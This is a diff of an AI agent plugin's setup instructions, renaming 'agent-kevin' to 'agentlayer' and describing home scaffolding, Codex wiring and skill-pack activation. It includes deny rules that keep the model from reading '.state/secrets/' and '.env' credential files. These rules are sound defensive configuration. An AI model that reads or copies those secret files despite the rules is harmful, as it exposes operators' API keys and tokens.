-**Secrets live in `.state/secrets/.env`, not here.** Credential pack keys (`PERPLEXITY_API_KEY`, `SERPAPI_KEY`, `OPENPAGERANK_API_KEY`, every `AGENT_DB_*`) go in the deny-gated `.state/secrets/.env` — `/agent-kevin:configure-skills` ensures that file exists and tells the user which `KEY=value` lines to add (the file is deny-gated, so Claude can't write its contents; the user edits it). Kevin's config loader surfaces it into `process.env` at boot; the settings `env` block is no longer a secrets store. `GSC_SITE_URL` is the one pack key that **stays** in `settings.local.json` `env` — it's not a credential and two skills (`wordpress-rest`, and the `seo` skill's audit) read it straight from the Bash environment, which only the settings `env` block reaches. Google OAuth client JSON + tokens live in `.state/secrets/google/`. This keeps `settings.local.json` non-secret and an accurate audit trail of what the operator opted into.
+**Secrets live in `.state/secrets/.env`, not here.** Credential pack keys (`PERPLEXITY_API_KEY`, `SERPAPI_KEY`, `OPENPAGERANK_API_KEY`, every `AGENT_DB_*`) go in the deny-gated `.state/secrets/.env` — `/agentlayer:configure-skills` ensures that file exists and tells the user which `KEY=value` lines to add (the file is deny-gated, so Claude can't write its contents; the user edits it). Kevin's config loader surfaces it into `process.env` at boot; the settings `env` block is no longer a secrets store. `GSC_SITE_URL` is the one pack key that **stays** in `settings.local.json` `env` — it's not a credential and two skills (`wordpress-rest`, and the `seo` skill's audit) read it straight from the Bash environment, which only the settings `env` block reaches. Google OAuth client JSON + tokens live in `.state/secrets/google/`. This keeps `settings.local.json` non-secret and an accurate audit trail of what the operator opted into.
 
 Env spelling: keys are written under their shared, agent-neutral `AGENT_*` names, the only names the plugin reads. The file's location already scopes them to this agent, and the HOME stays portable. A value in machine-wide `~/.claude/settings.json` reaches every agent home on the box, so per-home config always belongs in the home's own settings.
 
@@ -1432,7 +1432,7 @@ The rule: **init owns env keys that are universal to every operator; configure-s
   {
     "statusLine": "<the object printed by `bun \"$PLUGIN_ROOT/src/cli.ts\" statusline --setting`, unless either home file already has one>",
     "enabledPlugins": {
-      "agent-kevin@<MARKETPLACE>": true
+      "agentlayer@<MARKETPLACE>": true
     },
     "permissions": {
       "additionalDirectories": ["<CODE_ROOT>"]
@@ -1474,7 +1474,7 @@ updated: <YYYY-MM-DD>
 
 # Knowledge
 
-Master catalog of Kevin's compiled knowledge. Kevin keeps this current via `/agent-kevin:knowledge-compile`.
+Master catalog of Kevin's compiled knowledge. Kevin keeps this current via `/agentlayer:knowledge-compile`.
 
 ## User (<NAME>)
 
@@ -1488,7 +1488,7 @@ Long-form, evolving knowledge about the operator. Five facets, each updated as c
 
 ## Concepts (cross-cutting patterns)
 
-Cross-cutting patterns spanning ≥2 projects. Synthesized insights, not project summaries. The four seeded below describe the system itself; new concepts land here as `concepts/<slug>.md` after `/agent-kevin:knowledge-compile` runs.
+Cross-cutting patterns spanning ≥2 projects. Synthesized insights, not project summaries. The four seeded below describe the system itself; new concepts land here as `concepts/<slug>.md` after `/agentlayer:knowledge-compile` runs.
 
 - [[concepts/karpathy-wiki]] — LLM-maintained knowledge base architecture (the pattern behind this whole system)
 - [[concepts/markdown-native-task-management]] — File-per-task with YAML frontmatter, Obsidian UI, programmatic enforcement
@@ -1501,7 +1501,7 @@ Cross-cutting patterns spanning ≥2 projects. Synthesized insights, not project
 
 ## Reports (transient skill outputs — 3rd-degree context)
 
-- [reports/index](../reports/index.md) — dated audit trail of all skill outputs (briefings, plans, etc.). Read-only network of links; not absorbed into memory or concepts. Promote anything durable into `raw/inbox/` (via `kevin capture --file=...` or a direct drop) and compile. File is auto-created by `report_write` on the first reporting-skill call.
+- [reports/index](../reports/index.md) — dated audit trail of all skill outputs (briefings, plans, etc.). Read-only network of links; not absorbed into memory or concepts. Promote anything durable into `raw/inbox/` (via `agentlayer capture --file=...` or a direct drop) and compile. File is auto-created by `report_write` on the first reporting-skill call.
 
 ## Projects
 
@@ -1513,7 +1513,7 @@ Cross-project task dashboard: [projects/TASKS.md](../projects/TASKS.md).
 
 - `raw/sessions/YYYY-MM-DD.md` — auto-captured session transcripts (single file per day, no suffixes)
 - `raw/user/feedback.md` — append-only correction + reaction log; compiled into [[memory/index]] `## Learnings`
-- `raw/inbox/` — drop any input here (or use `kevin capture`) for compile to distill into concepts
+- `raw/inbox/` — drop any input here (or use `agentlayer capture`) for compile to distill into concepts
 - `raw/archive/inbox/` — compiled inbox items land here post-archive
 ```
 
@@ -1521,7 +1521,7 @@ Substitute `<NAME>` with the operator's name from Step 4a and `<YYYY-MM-DD>` wit
 
 **Write Step 5d's staged files.** Each project's `README.md` and `tasks/`, `concepts/company-profile.md` and `concepts/roadmap-draft.md`, skipping any path that already exists. Add each concept's bullet under `## Concepts` in `knowledge/index.md` when it isn't there yet, including in an index this step left alone: one appended line is not a rewrite. The `## Projects` table needs no edit; the first compile regenerates it from `projects/`.
 
-**Write `knowledge/memory/index.md` — strict preservation.** This is the highest-stakes file in the tree — months of `/agent-kevin:knowledge-compile` output (Active Threads, Recent Decisions, Learnings) live here.
+**Write `knowledge/memory/index.md` — strict preservation.** This is the highest-stakes file in the tree — months of `/agentlayer:knowledge-compile` output (Active Threads, Recent Decisions, Learnings) live here.
 
 - File missing OR file body is empty/whitespace-only → write the master-index scaffold below.
 - File exists with any non-whitespace body content → **never overwrite**. Skip the write entirely, no prompt. The Step 0 prompt already committed to preserving this; honour it unconditionally.
@@ -1541,7 +1541,7 @@ Living summary of what's active, recent, and important. Loaded every session.
 
 ## Active Threads
 
-_(empty — `/agent-kevin:knowledge-compile` populates this from session transcripts)_
+_(empty — `/agentlayer:knowledge-compile` populates this from session transcripts)_
 
 ## Recent Decisions
 
@@ -1590,7 +1590,7 @@ _No yearly goals set yet — run `goals year` to plan the year by quarters._
 <!-- GOALS:END -->
 ```
 
-After scaffolding, call `mcp__plugin_agent-kevin_kevin__dashboard` once so the file has its (empty) Active/Blocked/Overdue/Stale/Recently Closed sections rendered from day one — no scaffold drift (this also writes the first `dashboard.html`).
+After scaffolding, call `mcp__plugin_agentlayer_agent__dashboard` once so the file has its (empty) Active/Blocked/Overdue/Stale/Recently Closed sections rendered from day one — no scaffold drift (this also writes the first `dashboard.html`).
 
 **Seed concept articles — preservation-aware.** Four bundled concepts describe the system itself (the wiki pattern, the task system, the feedback loop, the audit-premise-decay heuristic). Seeding them means a freshly-initialised home has working `[[concepts/*]]` wikilinks from day one instead of broken refs, and the operator can read them to understand the architecture they just installed.
 
@@ -1631,13 +1631,13 @@ Idempotent by file, same as the concept seeding above: an existing rule file is 
 
 The generator adds `model = "gpt-6.1-sol"` and `model_reasoning_effort = "high"` when those keys are absent from the home config, including when the user-global config selects something else. Existing home-level values survive every regeneration. Report the resulting pair in Step 9; if the operator cannot access Sol, help them choose an available model and set it in the home config.
 
-Codex reads `AGENTS.md` natively but has no `@-import`, and as of Codex 0.153 a plugin can bundle neither hooks nor an MCP server that knows which home it serves (the server is launched inside the plugin cache, and Codex exports no workspace variable and advertises no MCP roots). So under Codex it lives per home: hooks in `$HOME_DIR/.codex/hooks.json`, the `kevin` MCP server plus the home's permission posture in `$HOME_DIR/.codex/config.toml`, and the command rules in `$HOME_DIR/.codex/rules/kevin.rules`, each pinned to this plugin checkout and this home. Generate them with the `codex_setup` MCP tool; never hand-write these files. The tool runs the generator outside the shell sandbox, which matters under Codex, where the workspace's `.codex/` directory is read-only to the model's shell. If the tool is unavailable (a session whose server has not started), the same generator runs from the shell:
+Codex reads `AGENTS.md` natively but has no `@-import`, and as of Codex 0.153 a plugin can bundle neither hooks nor an MCP server that knows which home it serves (the server is launched inside the plugin cache, and Codex exports no workspace variable and advertises no MCP roots). So under Codex it lives per home: hooks in `$HOME_DIR/.codex/hooks.json`, the `agent` MCP server plus the home's permission posture in `$HOME_DIR/.codex/config.toml`, and the command rules in `$HOME_DIR/.codex/rules/agent.rules`, each pinned to this plugin checkout and this home. Generate them with the `codex_setup` MCP tool; never hand-write these files. The tool runs the generator outside the shell sandbox, which matters under Codex, where the workspace's `.codex/` directory is read-only to the model's shell. If the tool is unavailable (a session whose server has not started), the same generator runs from the shell:
 
 ```bash
 bun "$PLUGIN_ROOT/skills/init/scripts/codex-setup.ts" --home "$HOME_DIR" --write
 ```
 
-If the operator once registered Kevin's server globally (`codex mcp add kevin …`), remove that copy with `codex mcp remove kevin` so the per-home registration is the only `kevin`. The report is `{ hooks, mcp, rules, entries, profile, notes }`, each file as `{ path, changed }`: one `SessionStart` entry delivers the static context (registered with `additionalContextLimit: 0`, since Codex otherwise truncates a hook's context at about 2,500 tokens), a `SessionEnd` and a `PreCompact` entry capture the session (the second one before Codex compacts a long thread, as on Claude Code), a `PreToolUse` entry runs the cwd-drift guard (below), the `[mcp_servers.kevin]` table launches the server with `AGENT_HOME` set, any stdio MCP server in `$HOME_DIR/.mcp.json` that a pack registered (the Xcode pack's `xcode`) or Claude Code runs (approved, not disabled) is mirrored into its own `[mcp_servers.<name>]` table so it reaches Codex whether it was added before or after (one using `${VAR}`, which Codex would not fill in, stays out with a note), and a `[tui]` table sets the footer status line (model with reasoning, directory, branch, approval mode, context used) unless the home already has one, and a `[skills]` table sets `max_context_tokens = 10000`, the most Codex allows for its per-turn skills catalog (the default is 2% of the model window, which trims the plugin's descriptions), unless the home already sets one. The posture is read from this home's Claude settings so the hosts never drift: a `[permissions.kevin]` profile denies the model every read of `.state/secrets/` and of any `.env` (the MCP server still reads them itself), makes `.git` writable so commits stay routine, and lists the code path and any `additionalDirectories` as workspace roots; every `Bash(…)` pattern in `permissions.ask` becomes a `prefix_rule` that prompts the operator, the same gate Claude Code applies; `approvals_reviewer` stays `user` (a reviewer model denied named pushes and local commits on this plugin's tests, so it is opt-in). Other hooks, other MCP servers, other rules files, and other settings are preserved; `notes` names a policy key the operator set differently, which is kept. Under Codex (`AGENT_HARNESS=codex`) run it without asking. Under Claude Code, ask once, always, with `AskUserQuestion`: "Do you also run OpenAI Codex from this home?" (options: "Yes, wire it now" / "No, Claude Code only"). A yes runs the generator now and carries the Codex lines of the relaunch block into Step 9; a no writes nothing, and `$upgrade` run from a Codex session wires the home later. Never skip the question silently: a home that is never asked never gets wired, and the only other route is a manual generator run. On native Windows (`$AGENT_PLATFORM=windows`) it runs the same way (the hook commands carry the home as a double-quoted `--home=` argument, shaped to parse under sh and PowerShell alike), but say once that Codex on Windows is unverified: no Windows box has exercised the wiring, and Kevin's skills are bash while Codex runs its shell through PowerShell there.
+If the operator once registered Kevin's server globally (`codex mcp add agent …`), remove that copy with `codex mcp remove agent` so the per-home registration is the only `agent`. The report is `{ hooks, mcp, rules, entries, profile, notes }`, each file as `{ path, changed }`: one `SessionStart` entry delivers the static context (registered with `additionalContextLimit: 0`, since Codex otherwise truncates a hook's context at about 2,500 tokens), a `SessionEnd` and a `PreCompact` entry capture the session (the second one before Codex compacts a long thread, as on Claude Code), a `PreToolUse` entry runs the cwd-drift guard (below), the `[mcp_servers.agent]` table launches the server with `AGENT_HOME` set, any stdio MCP server in `$HOME_DIR/.mcp.json` that a pack registered (the Xcode pack's `xcode`) or Claude Code runs (approved, not disabled) is mirrored into its own `[mcp_servers.<name>]` table so it reaches Codex whether it was added before or after (one using `${VAR}`, which Codex would not fill in, stays out with a note), and a `[tui]` table sets the footer status line (model with reasoning, directory, branch, approval mode, context used) unless the home already has one, and a `[skills]` table sets `max_context_tokens = 10000`, the most Codex allows for its per-turn skills catalog (the default is 2% of the model window, which trims the plugin's descriptions), unless the home already sets one. The posture is read from this home's Claude settings so the hosts never drift: a `[permissions.agent]` profile denies the model every read of `.state/secrets/` and of any `.env` (the MCP server still reads them itself), makes `.git` writable so commits stay routine, and lists the code path and any `additionalDirectories` as workspace roots; every `Bash(…)` pattern in `permissions.ask` becomes a `prefix_rule` that prompts the operator, the same gate Claude Code applies; `approvals_reviewer` stays `user` (a reviewer model denied named pushes and local commits on this plugin's tests, so it is opt-in). Other hooks, other MCP servers, other rules files, and other settings are preserved; `notes` names a policy key the operator set differently, which is kept. Under Codex (`AGENT_HARNESS=codex`) run it without asking. Under Claude Code, ask once, always, with `AskUserQuestion`: "Do you also run OpenAI Codex from this home?" (options: "Yes, wire it now" / "No, Claude Code only"). A yes runs the generator now and carries the Codex lines of the relaunch block into Step 9; a no writes nothing, and `$upgrade` run from a Codex session wires the home later. Never skip the question silently: a home that is never asked never gets wired, and the only other route is a manual generator run. On native Windows (`$AGENT_PLATFORM=windows`) it runs the same way (the hook commands carry the home as a double-quoted `--home=` argument, shaped to parse under sh and PowerShell alike), but say once that Codex on Windows is unverified: no Windows box has exercised the wiring, and Kevin's skills are bash while Codex runs its shell through PowerShell there.
 
 Then print the user-level note: Codex ignores telemetry and provider keys in a project config, the analytics, feedback, animation, and update-check keys are the operator's own rather than the home's, the context window is a cost choice for every session on the machine (the note asks for the cap Codex's model catalog serves, since a larger request is clamped to it), and the plugin never writes a user-global file, so generate the paste-ready block and quote it in Step 9 verbatim:
 
@@ -1649,17 +1649,17 @@ bun "$PLUGIN_ROOT/skills/init/scripts/codex-user-config.ts" --home "$HOME_DIR" -
 
 ## Step 8 — Optional: configure skill packs
 
-The scaffold is done. Before showing the final confirmation, offer to wire up API keys + MCP servers + permissions for the optional packs. This is exactly what `/agent-kevin:configure-skills` does — invoking inline so the user doesn't have to run it as a separate command after relaunch.
+The scaffold is done. Before showing the final confirmation, offer to wire up API keys + MCP servers + permissions for the optional packs. This is exactly what `/agentlayer:configure-skills` does — invoking inline so the user doesn't have to run it as a separate command after relaunch.
 
 `AskUserQuestion` (**multi-select**, so the user can tick any combination):
 
 > **Activate skill packs now?**
-> Each pack already ships loaded with the plugin. Activating a pack grants its MCP tool permissions in `settings.json` (so calls don't re-prompt), plants the non-secret `GSC_SITE_URL` placeholder in `settings.local.json`, and ensures `.state/secrets/.env` exists for the secret keys you'll add via your editor. Skip entirely if you want to come back later via `/agent-kevin:configure-skills`.
+> Each pack already ships loaded with the plugin. Activating a pack grants its MCP tool permissions in `settings.json` (so calls don't re-prompt), plants the non-secret `GSC_SITE_URL` placeholder in `settings.local.json`, and ensures `.state/secrets/.env` exists for the secret keys you'll add via your editor. Skip entirely if you want to come back later via `/agentlayer:configure-skills`.
 >
 > - ☐ SEO pack (the seo skill: audit · Search Console · PageSpeed · SERP · rank; plus wordpress-rest)
 > - ☑ Browser pack **(recommended)** (browser screenshot/pdf/record + browser-flows + optional Perplexity search)
 > - ☐ Database pack (connect Kevin to one or more Postgres databases — read-only `database_list`/`database_schema`/`database_query` + `database_fork` to clone a local DB for risky schema work)
-> - ☐ GitHub pack **(recommended when you gave a code path)** (PR, issue + GitHub Actions access — `github_pr_*` / `github_issue_*` / `github_run_*` — to review PRs/issues and diagnose failing CI builds, and the writes the token allows: issues and a PR's title or description, plus `github_fast_forward`, which is what keeps your checkouts current on every `/agent-kevin:sync`; needs a token per repo owner (`GITHUB_TOKEN_<OWNER>`, or one `GITHUB_TOKEN`) **and** the `gh` CLI)
+> - ☐ GitHub pack **(recommended when you gave a code path)** (PR, issue + GitHub Actions access — `github_pr_*` / `github_issue_*` / `github_run_*` — to review PRs/issues and diagnose failing CI builds, and the writes the token allows: issues and a PR's title or description, plus `github_fast_forward`, which is what keeps your checkouts current on every `/agentlayer:sync`; needs a token per repo owner (`GITHUB_TOKEN_<OWNER>`, or one `GITHUB_TOKEN`) **and** the `gh` CLI)
 > - ☐ Xcode pack (build, test, run and debug Apple apps + Swift packages through Apple's headless Xcode MCP server, with the sandbox and permission posture the toolchain needs; Xcode 27+, no API key)
 > - ☐ Slack pack (read-only Slack through your own account: pulses, the replies you owe, external threads waiting; needs a Slack app in your workspace, which the walk helps create, and a one-time sign-in from your terminal)
 > - ☐ Third-party libraries (aaron-he-zhu SEO/GEO skills, coreyhaines31 marketing playbooks, others)
@@ -1668,11 +1668,11 @@ Default-select **Browser** (recommended — Playwright's capture tools work imme
 
 **Never show the Xcode row on Windows, WSL2 or Linux** — render it only when `$AGENT_PLATFORM` = `macos`. Apple's toolchain doesn't exist on those hosts, so drop the row entirely rather than offering a pack that can only fail; a Windows operator should never see it as a choice. Leave it unticked even on macOS: plenty of Mac operators never open Xcode, and the pack asks for two manual steps (a sandbox exclusion and a sudo enablement) that are wasted on them.
 
-**Also default-tick GitHub when Step 4b captured a real code path.** `github_fast_forward` is what keeps those checkouts current during `/agent-kevin:sync`, and it needs a GitHub token; without the pack it returns `NOT_CONFIGURED` and the operator's code silently never refreshes — the one failure mode that degrades *answers* rather than surfacing an error, since Kevin keeps grounding confidently against a frozen checkout. An operator who just told init where their code lives has effectively asked for this. Leave it unticked when Step 4b returned `skip` (no checkout, nothing to fast-forward — the common case for a Kevin home). Either way it stays a tick the operator can clear.
+**Also default-tick GitHub when Step 4b captured a real code path.** `github_fast_forward` is what keeps those checkouts current during `/agentlayer:sync`, and it needs a GitHub token; without the pack it returns `NOT_CONFIGURED` and the operator's code silently never refreshes — the one failure mode that degrades *answers* rather than surfacing an error, since Kevin keeps grounding confidently against a frozen checkout. An operator who just told init where their code lives has effectively asked for this. Leave it unticked when Step 4b returned `skip` (no checkout, nothing to fast-forward — the common case for a Kevin home). Either way it stays a tick the operator can clear.
 
 Behavior on the response:
 - **Each ticked option**: run the matching configure-skills section in order — SEO (A.2a) → Browser (A.2b) → Database (A.2c) → GitHub (A.2d) → Xcode (A.2f) → Slack (A.2i) → Third-party (F). The walks **never prompt for API key values or connection strings in chat** — they add MCP grants to `settings.json`, plant the `GSC_SITE_URL` placeholder, and ensure `.state/secrets/.env` exists. The user adds the secret lines + values via their editor after relaunch.
-- **Nothing ticked**: skip — note "skill packs not activated — run `/agent-kevin:configure-skills` after relaunch" for Step 9's status block. Don't touch settings files.
+- **Nothing ticked**: skip — note "skill packs not activated — run `/agentlayer:configure-skills` after relaunch" for Step 9's status block. Don't touch settings files.
 
 For each picked option: **delegate to configure-skills** — open `${CLAUDE_PLUGIN_ROOT}/skills/configure-skills/SKILL.md` and follow the matching section. Honor every per-skill skip option inside that flow; don't force the user through items they don't want.
 
@@ -1709,29 +1709,29 @@ Blank line, then the status block as plain prose (one row per line, two-space gu
 > ✅ Home          `<HOME_DIR>`
 > ✅ Identity      SOUL.md · IDENTITY.md · USER.md
 > ✅ Operating manual   `<MANUAL_PATH>` (+ `.claude/CLAUDE.md`, the Claude Code bridge that `@-imports` it and the above)
-> ✅ Plugin reg    .claude/settings.local.json (auto-loads agent-kevin next launch — no `--plugin-dir` needed)
-> ✅ Status line   .claude/settings.local.json → `kevin statusline` (model · folder · branch / context · cost · time · rate limits; shows on relaunch)
+> ✅ Plugin reg    .claude/settings.local.json (auto-loads agentlayer next launch — no `--plugin-dir` needed)
+> ✅ Status line   .claude/settings.local.json → `agentlayer statusline` (model · folder · branch / context · cost · time · rate limits; shows on relaunch)
 > `<CODEX_HOOKS_ROW>`
 > ✅ Knowledge     `<FACET_FILES_FILLED>/5` facets populated `<from blog · LinkedIn · GitHub, if Step 5 ran>`
 > `<WORLD_ROW>`
 > ✅ Indexes       knowledge/index.md · knowledge/memory/index.md · projects/TASKS.md
-> ✅ Dashboard     dashboard.html — open it in any browser; rebuilt by every sync or `/agent-kevin:dashboard`
+> ✅ Dashboard     dashboard.html — open it in any browser; rebuilt by every sync or `/agentlayer:dashboard`
 > ✅ Concepts      4 seeded: karpathy-wiki · markdown-native-task-management · self-evolution-loop · audit-premise-decay
 > `<SKILL_PACK_ROW>`
 > `<HISTORY_ROW>`
 > ✅ Privacy       telemetry, crash reports, /feedback and the session survey off (.claude/settings.json)
 > ⏳ Training      on Free, Pro or Max, turn off **Help improve Claude**: claude.ai → your name → Settings → Privacy
-> ⏳ Custom skills none — author with `/agent-kevin:configure-skills`
+> ⏳ Custom skills none — author with `/agentlayer:configure-skills`
 
-For `<CODEX_HOOKS_ROW>`: if Step 7c ran → `✅ Codex wiring  .codex/hooks.json (4 entries; trust them via /hooks) + .codex/config.toml (kevin MCP server, permission profile, status line, skills budget) + .codex/rules/kevin.rules (<n> prompt rules, <m> forbidden rules) · user-level keys: .state/updates/codex-user-config.md`; otherwise omit the row.
+For `<CODEX_HOOKS_ROW>`: if Step 7c ran → `✅ Codex wiring  .codex/hooks.json (4 entries; trust them via /hooks) + .codex/config.toml (agent MCP server, permission profile, status line, skills budget) + .codex/rules/agent.rules (<n> prompt rules, <m> forbidden rules) · user-level keys: .state/updates/codex-user-config.md`; otherwise omit the row.
 
-For `<WORLD_ROW>`, from Step 5d: what landed, e.g. `✅ Your world    3 projects · roadmap draft · company profile · 4 documents in the inbox`; when every part was skipped → `⏳ Your world    nothing yet — drop documents into <KNOWLEDGE>/raw/inbox/ any time and run /agent-kevin:knowledge-compile`.
+For `<WORLD_ROW>`, from Step 5d: what landed, e.g. `✅ Your world    3 projects · roadmap draft · company profile · 4 documents in the inbox`; when every part was skipped → `⏳ Your world    nothing yet — drop documents into <KNOWLEDGE>/raw/inbox/ any time and run /agentlayer:knowledge-compile`.
 
 For `<SKILL_PACK_ROW>`, render the row based on what Step 8 did. Note: "activated" here means permissions granted + `.state/secrets/.env` ensured (and the `GSC_SITE_URL` placeholder planted), not key values — those come from the user editing `.state/secrets/.env` (secrets) and `settings.local.json` (`GSC_SITE_URL`).
-- If user skipped Step 8 entirely → `⏳ Skill packs   none activated — run /agent-kevin:configure-skills later`
+- If user skipped Step 8 entirely → `⏳ Skill packs   none activated — run /agentlayer:configure-skills later`
 - If user activated any pack → `✅ Skill packs   <list, e.g. "SEO (perms granted; fill SERPAPI_KEY + OPENPAGERANK_API_KEY in .state/secrets/.env, GSC_SITE_URL in settings.local.json), Browser (perms granted; PERPLEXITY_API_KEY in .state/secrets/.env is optional), Database (perms granted; fill AGENT_DB_<NAME> in .state/secrets/.env), GitHub (perms granted; fill GITHUB_TOKEN_<OWNER> per repo owner in .state/secrets/.env), Xcode (xcode MCP server registered + rules seeded; three manual steps left — see .state/updates/xcode-sandbox.md, the sudo enablement and the Apple skills export)">`
 
-For `<HISTORY_ROW>`: history turned on → `✅ History      on, kept in <gitDir> (a snapshot every sync)`; declined, or git not installed → `⏳ History      off — turn it on any time with /agent-kevin:history`; stopped before the first snapshot (setup reported `refused` or `failed`) → `⏳ History      not started — finish it with /agent-kevin:history`; the folder already had version history set up some other way (`managed-by-you`) → `✅ History      your own setup, left as it is`; its saved history is gone (`history-missing`) and the operator chose not to start over → `⏳ History      not started — start a new one with /agent-kevin:history`.
+For `<HISTORY_ROW>`: history turned on → `✅ History      on, kept in <gitDir> (a snapshot every sync)`; declined, or git not installed → `⏳ History      off — turn it on any time with /agentlayer:history`; stopped before the first snapshot (setup reported `refused` or `failed`) → `⏳ History      not started — finish it with /agentlayer:history`; the folder already had version history set up some other way (`managed-by-you`) → `✅ History      your own setup, left as it is`; its saved history is gone (`history-missing`) and the operator chose not to start over → `⏳ History      not started — start a new one with /agentlayer:history`.
 
 Use ✅ for what landed and ⏳ for deferred (the hourglass implies "queued for later"). Don't list `<FACET_FILES_FILLED>/5` if Step 5 was skipped — just say "stubs only" instead.
 
@@ -1751,9 +1751,9 @@ Blank line, then the **Next** heading (same style as Ready), then the relaunch p
 >   - `OPENPAGERANK_API_KEY` — SEO pack (https://openpagerank.com)
 >   - `AGENT_DB_<NAME>` — Database pack: one Postgres connection string per line
 >   - `GITHUB_TOKEN_<OWNER>` — GitHub pack: one fine-grained, read-only PAT per repo owner (PRs·Issues·Metadata·Actions·Contents — NOT Workflows; there is no Checks permission for PATs), named for the owner (`my-org` → `GITHUB_TOKEN_MY_ORG`); `GITHUB_TOKEN` covers any owner without its own. Needs the `gh` CLI on PATH (`brew install gh`).
-> - **Private config → `<HOME_DIR>/.claude/settings.local.json`** `env`: init wrote `AGENT_HOME_TIMEZONE` (your home base — sessions flag traveling when the machine timezone differs), plus `AGENT_CODE_PATH` / `AGENT_GIT_REPOS` if you gave a codebase path at Step 4b. Set `GSC_SITE_URL` here (your Search Console property — not a secret, and Bash-based SEO skills read it from here) before running `mcp__plugin_agent-kevin_kevin__google_auth`. For Google, drop the OAuth client JSON at `<HOME_DIR>/.state/secrets/google/google-oauth-client.json`.
+> - **Private config → `<HOME_DIR>/.claude/settings.local.json`** `env`: init wrote `AGENT_HOME_TIMEZONE` (your home base — sessions flag traveling when the machine timezone differs), plus `AGENT_CODE_PATH` / `AGENT_GIT_REPOS` if you gave a codebase path at Step 4b. Set `GSC_SITE_URL` here (your Search Console property — not a secret, and Bash-based SEO skills read it from here) before running `mcp__plugin_agentlayer_agent__google_auth`. For Google, drop the OAuth client JSON at `<HOME_DIR>/.state/secrets/google/google-oauth-client.json`.
 >
-> Didn't tick a pack at Step 8? Run `/agent-kevin:configure-skills` later — it adds permissions, ensures `.state/secrets/.env` exists, and tells you the lines to add via your editor. Tools whose key is missing stay loaded but return "missing env var" if called — add the line any time later and the next session picks it up.
+> Didn't tick a pack at Step 8? Run `/agentlayer:configure-skills` later — it adds permissions, ensures `.state/secrets/.env` exists, and tells you the lines to add via your editor. Tools whose key is missing stay loaded but return "missing env var" if called — add the line any time later and the next session picks it up.
 >
 > **Always launch <AGENT_NAME> from its home — `<HOME_DIR>`.** The habit is `cd <HOME_DIR> && claude` every time. The home is then resolved from where you launched, and a session that `cd`s off into a repo mid-flight still resolves correctly, because the launch directory doesn't roam even when your shell does.
 >
@@ -1774,27 +1774,27 @@ Blank line, then the **Next** heading (same style as Ready), then the relaunch p
 > claude
 > ```
 >
-> **Running Codex from this home?** Relaunch with `codex` instead, trust the folder when asked (that is what lets Codex read the home's `.codex/config.toml`, where Kevin's MCP server is registered), run `/hooks`, and trust the 4 Kevin entries (the ones whose command runs `src/cli.ts`: `session-start`, `session-capture` twice, `guard`). Until then, Codex starts without Kevin's context and captures nothing. Skills are invoked with `$name` there (`$briefing`, `$sync`); the plugin itself installs with `codex plugin marketplace add <PLUGIN_DIR>` then `codex plugin add agent-kevin@agentdev-kevin`.
+> **Running Codex from this home?** Relaunch with `codex` instead, trust the folder when asked (that is what lets Codex read the home's `.codex/config.toml`, where Kevin's MCP server is registered), run `/hooks`, and trust the 4 Kevin entries (the ones whose command runs `src/cli.ts`: `session-start`, `session-capture` twice, `guard`). Until then, Codex starts without Kevin's context and captures nothing. Skills are invoked with `$name` there (`$briefing`, `$sync`); the plugin itself installs with `codex plugin marketplace add <PLUGIN_DIR>` then `codex plugin add agentlayer@agentlayer-dev`.
 >
 > **Watch for a marketplace trust prompt.** On first relaunch, Claude Code asks "this project wants to register a marketplace and enable a plugin — trust it?" **Accept it.** If you dismiss/miss the prompt, the plugin won't load and the SessionStart banner won't appear — recover by running:
 >
 > ```
 > /plugin marketplace add <PLUGIN_DIR>
-> /plugin install agent-kevin@agentdev-kevin
+> /plugin install agentlayer@agentlayer-dev
 > ```
 >
 > (where `<PLUGIN_DIR>` is the absolute path of the cloned plugin — same path as `${CLAUDE_PLUGIN_ROOT}` during this init session.)
 >
 > **Your first session opens with a welcome.** Say hi and <AGENT_NAME> suggests where to start, beginning with your roadmap.
 >
-> `/agent-kevin:dashboard` opens the Agent OS dashboard, your whole setup on one page. Open `<HOME_DIR>` in Obsidian to view/edit your wiki.
+> `/agentlayer:dashboard` opens the Agent OS dashboard, your whole setup on one page. Open `<HOME_DIR>` in Obsidian to view/edit your wiki.
 
 ---
 
 ## Notes for you (the orchestrating Claude)
 
 - **Idempotent.** Step 0 catches re-runs and surfaces the explicit write list. Step 7's facet + index writes preserve operator-curated content (`knowledge/user/*.md`, `knowledge/index.md`) and never replace existing compile output (`knowledge/memory/index.md`). Re-running on an active HOME is safe.
-- **No secrets in identity files.** API keys go to `<HOME>/.claude/settings.local.json` via the configure-skills flow (Step 8 inline or `/agent-kevin:configure-skills` later), never to AGENTS/SOUL/IDENTITY/USER.
+- **No secrets in identity files.** API keys go to `<HOME>/.claude/settings.local.json` via the configure-skills flow (Step 8 inline or `/agentlayer:configure-skills` later), never to AGENTS/SOUL/IDENTITY/USER.
 - **AGENTS.md and .claude/CLAUDE.md are never customised.** Copy verbatim (placeholders substituted). SOUL.md adjusts tone. USER.md gets the user's headline. IDENTITY.md adjusts role.
 - **Stage before write.** Build all content through Steps 2–6. Only Step 7 writes to disk.
 - **Step 8 delegates, doesn't duplicate.** When the user opts to configure skills inline, *read* `${CLAUDE_PLUGIN_ROOT}/skills/configure-skills/SKILL.md` and follow its Section A walks. Don't reimplement key-prompts/MCP-writes/permission-grants here — keep configure-skills as the single source of truth so standalone use and inline use behave identically.
